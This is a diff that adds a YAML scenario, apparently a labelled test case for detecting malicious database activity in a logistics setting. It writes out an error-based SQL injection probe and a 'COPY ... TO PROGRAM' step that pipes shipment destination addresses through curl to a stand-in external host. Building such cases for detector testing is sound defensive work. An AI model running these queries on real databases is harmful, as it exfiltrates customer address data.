@@ -1,0 +1,24 @@
+scenario_id: gen_logistics_01_sql_injection_mal_36
+family_id: gen_logistics_01_sql_injection_mal_fam36
+domain: logistics
+time_of_day: '22:20'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT vehicle_id, plate_number FROM vehicles WHERE shipment_id = CAST((SELECT
+      dest_address FROM shipments LIMIT 1) AS INTEGER)
+  - step_id: exfil
+    sql: COPY (SELECT dest_address FROM shipments) TO PROGRAM 'curl -sX POST https://customs-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 45.77.83.73
+      port: 8080
